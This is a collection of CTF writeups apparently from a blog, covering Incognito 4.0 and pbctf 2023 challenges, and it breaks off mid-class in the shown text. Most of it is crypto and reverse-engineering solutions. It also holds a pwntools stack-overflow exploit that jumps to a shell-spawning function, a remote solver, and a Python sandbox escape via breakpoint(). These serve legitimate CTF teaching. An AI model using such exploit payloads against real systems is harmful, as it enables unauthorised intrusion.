---
title: Brief Writeups for CTFs of Feb Week 3
category: [Writeup, Contests] 
tags: [ctf,crypto,reverse,pwn]
---
# Incognito 4.0

## Ancient
First we open it by 010editor. From the hexdump we can see there is a string "IHDR", so we guess it's a .png file.
```
00000000  00 00 00 00 aa 0a 1a 0a 00 00 00 0d 49 48 44 52  |....ª.......IHDR|
```
Grab a file header from an unmodified png file(just the signature is enough).
```
00000000  89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52  |.PNG........IHDR|
```
Open the file, and we see:

![challenge.png](data:image/png;base64,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)

By google lens we know it's Medieval Cistercian Numbers.

Decode it to numbers, and then decode the numbers by ascii to string:
```py
>>> bytes([105,99,116,102,123,48,108,100,95,109,48,110,107,95,49,57,48,100,101,49,99,51,125])
b'ictf{0ld_m0nk_190de1c3}'
```

## babyFlow
source:
```c
int get_shell()
{
  return execve("/bin/sh", 0, 0);
}
char *__cdecl vulnerable_function(char *src)
{
  char dest[16]; // [esp+4h] [ebp-14h] BYREF

  return strcpy(dest, src);
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[80]; // [esp+0h] [ebp-58h] BYREF
  int *p_argc; // [esp+50h] [ebp-8h]

  p_argc = &argc;
  puts("can you pass me?");
  gets(s);
  vulnerable_function(s);
  return 0;
}
```

```
.text:080491FC                               public get_shell
```
exp:
```py
from pwn import *
p = process('./babyflow')
# p = remote('143.198.219.171',5000)
payload = b'a'*20+p32(0x080491FC)
p.sendline(payload)
p.interactive()
```

## Crypto 1
`chal.py`:
```py
flag = "" #redacted
flag = flag[:15]

def func(f, i):
    if i<5:
        out = ord(f) ^ 0x76 ^ 0xAD
        var1 = (out & 0xAA) >> 1
        var2 = 2 * out & 0xAA
        return var1 | var2 
    elif i>=5 and i<10:
        out = ord(f) ^ 0x76 ^ 0xBE
        var1 = (out & 0xCC) >> 2
        var2 = 4 * out & 0xCC
        return var1 | var2
    else:
        out = ord(f) ^ 0x76 ^ 0xEF
        var1 = (out & 0xF0) >> 4
        var2 = 16 * out & 0xF0
        return var1 | var2

res = ''
for i in range(15):
	res += chr(func(flag[i], i))
f = open('result','w')
f.write(res)
f.close()
```
hexdump of result:
```
00000000  c3 93 c3 93 7e c3 94 c3 97 c2 a3 c3 b6 c2 ae c2  |Ã.Ã.~Ã.Ã.Â£Ã¶Â®Â|
00000010  a3 c3 b6 c2 8f c2 bf c3 9a c3 9a c2 aa           |£Ã¶Â.Â¿Ã.Ã.Âª|
```
exp:
```py
c = bytes.fromhex('C3 93 C3 93 7E C3 94 C3 97 C2 A3 C3 B6 C2 AE C2 A3 C3 B6 C2 8F C2 BF C3 9A C3 9A C2 AA')
cc = []
i = 0
while i < len(c):
	if c[i]==0xc3:
		cc.append(c[i+1]+0x40)
		i+=2
	elif c[i]==0xc2:
		cc.append(c[i+1])
		i+=2
	else:
		cc.append(c[i])
		i+=1
c = bytes(cc)
m = [0]*15
def func(f, i):
    if i<5:
        out = ord(f) ^ 0x76 ^ 0xAD
        var1 = (out & 0xAA) >> 1
        var2 = 2 * out & 0xAA
        return var1 | var2 
    elif i>=5 and i<10:
        out = ord(f) ^ 0x76 ^ 0xBE
        var1 = (out & 0xCC) >> 2
        var2 = 4 * out & 0xCC
        return var1 | var2
    else:
        out = ord(f) ^ 0x76 ^ 0xEF
        var1 = (out & 0xF0) >> 4
        var2 = 16 * out & 0xF0
        return var1 | var2

for i in range(15):
	for j in range(128):
		if(func(chr(j),i)==c[i]):
			m[i]=j
			break

print(bytes(m))

# ictf{88f30d1cd1ab443}
```

## Gainme
More like a reverse challenge than a pwn.

Source:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4[4]; // [esp+0h] [ebp-60h]
  char v5[64]; // [esp+10h] [ebp-50h] BYREF
  void (__cdecl *v6)(char *); // [esp+50h] [ebp-10h]
  int i; // [esp+54h] [ebp-Ch]
  int *p_argc; // [esp+58h] [ebp-8h]

  p_argc = &argc;
  v4[0] = (int)lvlone;
  v4[1] = (int)lvltwo;
  v4[2] = (int)lvlthree;
  v4[3] = (int)lvlfour;
  setvbuf(stdout, 0, 2, 0);
  puts("Solve the levels to gain access to the flag");
  for ( i = 0; i <= 3; ++i )
  {
    printf("Enter input for Level %d: ", i);
    __isoc99_scanf("%s", v5);
    v6 = (void (__cdecl *)(char *))v4[i];
    v6(v5);
  }
  print_flag();
  return 0;
}
int __cdecl lvlone(char *s1)
{
  int result; // eax

  result = strcmp(s1, "ICTF4");
  if ( result )
    exit(0);
  return result;
}
size_t __cdecl lvltwo(char *a1)
{
  size_t result; // eax
  char s[16]; // [esp+Ah] [ebp-1Eh] BYREF
  __int16 v3; // [esp+1Ah] [ebp-Eh]
  size_t i; // [esp+1Ch] [ebp-Ch]

  *(__m128i *)s = _mm_load_si128((const __m128i *)&xmmword_2090);
  v3 = 0x63;
  for ( i = 0; ; ++i )
  {
    result = strlen(s);
    if ( i >= result )
      break;
    if ( s[i] != a1[i] )
      exit(0);
  }
  return result;
}
Elf32_Dyn **__cdecl lvlthree(_DWORD *a1)
{
  Elf32_Dyn **result; // eax

  result = &GLOBAL_OFFSET_TABLE_;
  if ( *a1 != 0xDEADBEEF )
    exit(0);
  return result;
}
int __cdecl lvlfour(char *s)
{
  int v2; // [esp+Ch] [ebp-Ch]

  if ( strlen(s) > 3 )
    exit(0);
  v2 = atoi(s);
  if ( v2 * v2 * v2 + -3 * v2 * v2 + 3 * v2 - 1 )
    exit(0);
  return puts("Congratulations");
}
int print_flag()
{
  char v1; // [esp+7h] [ebp-11h]
  __gid_t v2; // [esp+8h] [ebp-10h]
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  v2 = getegid();
  setresgid(v2, v2, v2);
  if ( !stream )
    return puts("Error");
  while ( 1 )
  {
    v1 = fgetc(stream);
    if ( v1 == -1 )
      break;
    putchar(v1);
  }
  return fclose(stream);
}
```
```
.rodata:00002090 64 61 73 44 41 53 51 57 67 6A+xmmword_2090 xmmword 'sdokrtjgWQSADsad' ; DATA XREF: lvltwo+19↑r
.rodata:00002090 74 72 6B 6F 64 73             _rodata ends
```
exp:
```py
from pwn import *
# p = process('./gainme')
p = remote('143.198.219.171',5003)
# context(log_level='debug',os='linux',arch='i386')
p.sendline(b'ICTF4')
p.sendline(b'dasDASQWgjtrkodsc')
p.sendline(p32(0xDEADBEEF))
import z3
v2 = z3.Int('v2')
s = z3.Solver()
s.add(v2 * v2 * v2 + -3 * v2 * v2 + 3 * v2 - 1 == 0)
if s.check() == z3.sat:
	v2 = s.model().eval(v2).as_long()
# v2 = 1
p.sendline(str(v2).encode())
p.interactive()
# ictf{g@inm3-sf23f-4fd2150cd33db}
```
Remember to add the 'c'(0x63) in `lvltwo`.

## Meow
First if you decompile `main()`, you will found nothing in it.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  return 0;
}
```
That's true! It actually did nothing.
```
.text:0000000000001119
.text:0000000000001119                               ; =============== S U B R O U T I N E =======================================
.text:0000000000001119
.text:0000000000001119                               ; Attributes: bp-based frame
.text:0000000000001119
.text:0000000000001119                               ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000001119                               public main
.text:0000000000001119                               main proc near                          ; DATA XREF: _start+18↑o
.text:0000000000001119
.text:0000000000001119                               var_10= qword ptr -10h
.text:0000000000001119                               var_4= dword ptr -4
.text:0000000000001119
.text:0000000000001119                               ; __unwind {
.text:0000000000001119 55                            push    rbp
.text:000000000000111A 48 89 E5                      mov     rbp, rsp
.text:000000000000111D 89 7D FC                      mov     [rbp+var_4], edi
.text:0000000000001120 48 89 75 F0                   mov     [rbp+var_10], rsi
.text:0000000000001124 B8 00 00 00 00                mov     eax, 0
.text:0000000000001129 5D                            pop     rbp
.text:000000000000112A C3                            retn
.text:000000000000112A                               ; } // starts at 1119
.text:000000000000112A
.text:000000000000112A                               main endp
.text:000000000000112A
.text:000000000000112A                               _text ends
.text:000000000000112A
```
So where's the flag? Scrolling down and we find some suspicious data:
```
.rodata:0000000000002008 00                            unk_2008 db    0                        ; DATA XREF: .data:x↓o
.rodata:0000000000002009 69                            db  69h ; i
.rodata:000000000000200A 00                            db    0
.rodata:000000000000200B 63                            db  63h ; c
.rodata:000000000000200C 00                            db    0
.rodata:000000000000200D 74                            db  74h ; t
.rodata:000000000000200E 00                            db    0
.rodata:000000000000200F 66                            db  66h ; f
.rodata:0000000000002010 00                            db    0
.rodata:0000000000002011 7B                            db  7Bh ; {
.rodata:0000000000002012 00                            db    0
.rodata:0000000000002013 65                            db  65h ; e
.rodata:0000000000002014 00                            db    0
.rodata:0000000000002015 61                            db  61h ; a
.rodata:0000000000002016 00                            db    0
.rodata:0000000000002017 73                            db  73h ; s
.rodata:0000000000002018 00                            db    0
.rodata:0000000000002019 69                            db  69h ; i
.rodata:000000000000201A 00                            db    0
.rodata:000000000000201B 65                            db  65h ; e
.rodata:000000000000201C 00                            db    0
.rodata:000000000000201D 73                            db  73h ; s
.rodata:000000000000201E 00                            db    0
.rodata:000000000000201F 74                            db  74h ; t
.rodata:0000000000002020 00                            db    0
.rodata:0000000000002021 5F                            db  5Fh ; _
.rodata:0000000000002022 00                            db    0
.rodata:0000000000002023 63                            db  63h ; c
.rodata:0000000000002024 00                            db    0
.rodata:0000000000002025 68                            db  68h ; h
.rodata:0000000000002026 00                            db    0
.rodata:0000000000002027 61                            db  61h ; a
.rodata:0000000000002028 00                            db    0
.rodata:0000000000002029 6C                            db  6Ch ; l
.rodata:000000000000202A 00                            db    0
.rodata:000000000000202B 6C                            db  6Ch ; l
.rodata:000000000000202C 00                            db    0
.rodata:000000000000202D 65                            db  65h ; e
.rodata:000000000000202E 00                            db    0
.rodata:000000000000202F 6E                            db  6Eh ; n
.rodata:0000000000002030 00                            db    0
.rodata:0000000000002031 67                            db  67h ; g
.rodata:0000000000002032 00                            db    0
.rodata:0000000000002033 65                            db  65h ; e
.rodata:0000000000002034 00                            db    0
.rodata:0000000000002035 5F                            db  5Fh ; _
.rodata:0000000000002036 00                            db    0
.rodata:0000000000002037 6F                            db  6Fh ; o
.rodata:0000000000002038 00                            db    0
.rodata:0000000000002039 66                            db  66h ; f
.rodata:000000000000203A 00                            db    0
.rodata:000000000000203B 5F                            db  5Fh ; _
.rodata:000000000000203C 00                            db    0
.rodata:000000000000203D 74                            db  74h ; t
.rodata:000000000000203E 00                            db    0
.rodata:000000000000203F 68                            db  68h ; h
.rodata:0000000000002040 00                            db    0
.rodata:0000000000002041 65                            db  65h ; e
.rodata:0000000000002042 00                            db    0
.rodata:0000000000002043 6D                            db  6Dh ; m
.rodata:0000000000002044 00                            db    0
.rodata:0000000000002045 5F                            db  5Fh ; _
.rodata:0000000000002046 00                            db    0
.rodata:0000000000002047 61                            db  61h ; a
.rodata:0000000000002048 00                            db    0
.rodata:0000000000002049 6C                            db  6Ch ; l
.rodata:000000000000204A 00                            db    0
.rodata:000000000000204B 6C                            db  6Ch ; l
.rodata:000000000000204C 00                            db    0
.rodata:000000000000204D 7D                            db  7Dh ; }
.rodata:000000000000204E 00                            db    0
.rodata:000000000000204E                               _rodata ends
.rodata:000000000000204E
```
Wow, it seems that this is just the flag. Let's put them together:
```py
print(bytes.fromhex("""00 69 00 63 00 74 00 66 00 7B 00 65 00 61 00 73
00 69 00 65 00 73 00 74 00 5F 00 63 00 68 00 61
00 6C 00 6C 00 65 00 6E 00 67 00 65 00 5F 00 6F
00 66 00 5F 00 74 00 68 00 65 00 6D 00 5F 00 61
00 6C 00 6C 00 7D
""".replace('00','')))
# ictf{easiest_challenge_of_them_all}
```

## pyjail
```py
import string

ALLOWED_CHARS = string.ascii_letters + string.digits + '.' + '=' + "\"" + " " + "(" + ")" + "*" + ":"+"'"+","

FORBIDDEN_BUILTINS = ['open', 'eval', 'exec', 'execfile']

def check_input(input_str):
    for char in input_str:
        if char not in ALLOWED_CHARS:
            raise ValueError("Error: forbidden character '{}'".format(char))

def remove_builtins():
    for builtin in FORBIDDEN_BUILTINS:
        if builtin in globals():
            del globals()[builtin]

remove_builtins()

# start the jail
print("Welcome to the IIITL Jail! Escape if you can")

while True:
    try:
        user_input = input("jail> ")
        check_input(user_input)
        exec(user_input)
    except Exception as e:
        print("Error:", e)
```
Solution:

All you need is just a `breakpoint()`.

# pbctf 2023
`task.py`:
## Blocky -0
```py
#!/usr/bin/env python3
import hashlib
import os
import signal

from Cipher import BlockCipher
from GF import GF

def handler(_signum, _frame):
    print("Time out!")
    exit(0)


def get_random_block():
    block = b''
    while len(block) < 9:
        b = os.urandom(1)
        if b[0] < 243:
            block += b
    return block


def get_mac(pt):
    mac = hashlib.sha256(pt).digest()[:9]
    return bytes([x % 243 for x in mac])


def pad(pt):
    mac = get_mac(pt)
    v = 9 - len(pt) % 9
    return pt + bytes([v] * v) + mac


def unpad(pt):
    if len(pt) < 18 or len(pt) % 9 != 0:
        return
    pt, mac = pt[:-9], pt[-9:]
    if not (1 <= pt[-1] <= 9):
        print('pad not match')
        return
    
    pt = pt[:-pt[-1]]
    if mac == get_mac(pt):
        return pt
    else:
        print('mac not match')

def add(a, b):
    return bytes([(GF(x) + GF(y)).to_int() for x, y in zip(a, b)])


def sub(a, b):
    return bytes([(GF(x) - GF(y)).to_int() for x, y in zip(a, b)])


def main():
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(60)
    key = get_random_block()
    cipher = BlockCipher(key, 20)

    while True:
        inp = input("> ")

        if inp == 'E':
            inp = input("Input (in hex): ")
            inp = bytes.fromhex(inp)
            assert len(inp) < 90
            assert all(b < 243 for b in inp)

            if inp == 'gimmeflag':
                print("Result: None")
                continue

            pt = pad(inp)
            iv = get_random_block()
            enc = iv

            for i in range(0, len(pt), 9):
                t = add(pt[i:i+9], iv)
                iv = cipher.encrypt(t)
                enc += iv
            
            print(f"Result: {enc.hex()}")
        elif inp == 'D':
            inp = input("Input (in hex): ")
            inp = bytes.fromhex(inp)
            assert len(inp) < 108
            assert all(b < 243 for b in inp)

            iv, ct = inp[:9], inp[9:]
            dec = b''

            for i in range(0, len(ct), 9):
                t = cipher.decrypt(ct[i:i+9])
                dec += sub(t, iv)
                iv = ct[i:i+9]

            pt = unpad(dec)
            if pt == b'gimmeflag':
                with open('flag', 'r') as f:
                    flag = f.read()
                    print(flag)
                exit(0)
            elif pt:
                print(f"Result: {pt.hex()}")
            else:
                print("Result: None")


if __name__ == "__main__":
    main()
```
`Cipher.py`:
```py
from GF import GF

SBOX, INV_SBOX = dict(), dict()
for i in range(3 ** 5):
    v = GF(23) + (GF(0) if i == 0 else GF(i).inverse())
    SBOX[GF(i)] = v
    INV_SBOX[v] = GF(i)

class BlockCipher:
    def __init__(self, key: bytes, rnd: int):
        assert len(key) == 9
        sks = [GF(b) for b in key]
        for i in range(rnd * 9):
            sks.append(sks[-1] + SBOX[sks[-9]])
        self.subkeys = [sks[i:i+9] for i in range(0, (rnd + 1) * 9, 9)]
        self.rnd = rnd

    def _add_key(self, l1, l2):
        return [x + y for x, y in zip(l1, l2)]

    def _sub_key(self, l1, l2):
        return [x - y for x, y in zip(l1, l2)]
    
    def _sub(self, l):
        return [SBOX[x] for x in l]

    def _sub_inv(self, l):
        return [INV_SBOX[x] for x in l]
    
    def _shift(self, b):
        return [
            b[0], b[1], b[2],
            b[4], b[5], b[3],
            b[8], b[6], b[7]
        ]
    
    def _shift_inv(self, b):
        return [
            b[0], b[1], b[2],
            b[5], b[3], b[4],
            b[7], b[8], b[6]
        ]
    
    def _mix(self, b):
        b = b[:] # Copy
        for i in range(3):
            x = GF(7) * b[i] + GF(2) * b[3 + i] + b[6 + i]
            y = GF(2) * b[i] + b[3 + i] + GF(7) * b[6 + i]
            z = b[i] + GF(7) * b[3 + i] + GF(2) * b[6 + i]
            b[i], b[3 + i], b[6 + i] = x, y, z
        return b
    
    def _mix_inv(self, b):
        b = b[:] # Copy
        for i in range(3):
            x = GF(86) * b[i] + GF(222) * b[3 + i] + GF(148) * b[6 + i]
            y = GF(222) * b[i] + GF(148) * b[3 + i] + GF(86) * b[6 + i]
            z = GF(148) * b[i] + GF(86) * b[3 + i] + GF(222) * b[6 + i]
            b[i], b[3 + i], b[6 + i] = x, y, z
        return b
    
    def encrypt(self, inp: bytes):
        assert len(inp) == 9
        b = [GF(x) for x in inp]
        
        b = self._add_key(b, self.subkeys[0])
        for i in range(self.rnd):
            b = self._sub(b)
            b = self._shift(b)
            if i < self.rnd - 1:
                b = self._mix(b)
            b = self._add_key(b, self.subkeys[i + 1])
        
        return bytes([x.to_int() for x in b])
    
    def decrypt(self, inp: bytes):
        assert len(inp) == 9
        b = [GF(x) for x in inp]

        for i in reversed(range(self.rnd)):
            b = self._sub_key(b, self.subkeys[i + 1])
            if i < self.rnd - 1:
                b = self._mix_inv(b)
            b = self._shift_inv(b)
            b = self._sub_inv(b)
        b = self._sub_key(b, self.subkeys[0])
        
        return bytes([x.to_int() for x in b])

if __name__ == "__main__":
    import random
    key = bytes(random.randint(0, 242) for i in range(9))
    cipher = BlockCipher(key, 4)
    for _ in range(100):
        pt = bytes(random.randint(0, 242) for i in range(9))
        ct = cipher.encrypt(pt)
        pt_ = cipher.decrypt(ct)
        assert pt == pt_
```
`GF.py`:
```py
class GF:
    def __init__(self, value):
        if type(value) == int:
            self.value = [(value // (3 ** i)) % 3 for i in range(5)]
        elif type(value) == list and len(value) == 5:
            self.value = value
        else:
            assert False, "Wrong input to the constructor"

    def __str__(self):
        return f"GF({self.to_int()})"

    def __repr__(self):
        return str(self)

    def __hash__(self):
        return hash(tuple(self.value))

    def __eq__(self, other):
        assert type(other) == GF
        return self.value == other.value
    
    def __add__(self, other):
        assert type(other) == GF
        return GF([(x + y) % 3 for x, y in zip(self.value, other.value)])
    
    def __sub__(self, other):
        assert type(other) == GF
        return GF([(x - y) % 3 for x, y in zip(self.value, other.value)])
    
    def __mul__(self, other):
